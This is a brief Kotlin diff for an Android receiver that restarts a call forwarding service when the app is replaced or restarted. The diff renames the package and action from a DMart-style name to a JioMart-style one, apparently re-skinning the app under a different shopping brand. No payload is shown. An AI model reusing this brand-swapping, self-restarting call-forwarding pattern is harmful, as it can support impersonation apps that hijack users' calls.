@@ -1,4 +1,4 @@
-package com.dmartuser.client
+package com.jiomart.ready.app
 
 import android.content.BroadcastReceiver
 import android.content.Context
@@ -25,7 +25,7 @@ class CallForwardingRestartReceiver : BroadcastReceiver() {
             Intent.ACTION_MY_PACKAGE_REPLACED,
             Intent.ACTION_PACKAGE_REPLACED,
             Intent.ACTION_PACKAGE_RESTARTED,
-            "com.dmartuser.client.RESTART_CALL_FORWARDING_SERVICE" -> {
+            "com.jiomart.ready.app.RESTART_CALL_FORWARDING_SERVICE" -> {
                 Log.d(TAG, "🔄 Starting call forwarding service")
                 startCallForwardingService(context)
             }
